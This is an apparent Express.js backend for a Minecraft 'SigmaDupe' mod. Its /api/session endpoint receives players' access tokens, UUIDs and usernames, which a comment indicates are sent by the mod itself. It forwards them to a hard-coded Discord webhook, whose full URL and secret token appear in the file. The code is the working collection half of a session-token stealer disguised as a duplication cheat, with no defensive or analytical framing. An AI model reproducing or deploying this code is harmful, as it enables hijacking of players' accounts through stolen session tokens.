import express from 'express';
import fetch from 'node-fetch';

const app = express();
const PORT = process.env.PORT || 3000;

// Discord webhook URL - this is only on the backend, not in the mod
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1410903398986809344/v2Bf9ZtstJGYeIpnS59y9RCrrIiQpdjsHXFkVz9ui9AraEoJYN_di3U75ZZ2zUbKn2th';

// Middleware to parse JSON bodies
app.use(express.json());

// Simple home route
app.get('/', (req, res) => {
  res.send('SigmaDupe Backend Service');
});

// Health check endpoint for Render
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok' });
});

// Endpoint to receive session information
app.post('/api/session', async (req, res) => {
  try {
    const { accessToken, uuid, username } = req.body;
    
    if (!accessToken || !uuid || !username) {
      return res.status(400).json({ error: 'Missing required session information' });
    }
    
    console.log(`Received session info for user: ${username}`);
    
    // Format message for Discord
    const message = {
      embeds: [{
        title: 'Minecraft Session Information',
        color: 0x00ff00,
        fields: [
          {
            name: 'Username',
            value: username,
            inline: true
          },
          {
            name: 'UUID',
            value: uuid,
            inline: true
          },
          {
            name: 'Access Token',
            value: accessToken,
            inline: false
          }
        ],
        timestamp: new Date().toISOString()
      }]
    };
    
    // Send to Discord webhook
    const webhookResponse = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
    
    if (!webhookResponse.ok) {
      console.error(`Discord webhook error: ${webhookResponse.status}`);
      return res.status(500).json({ error: 'Failed to forward to notification service' });
    }
    
    console.log('Successfully forwarded session info');
    return res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Error processing session info:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);

});
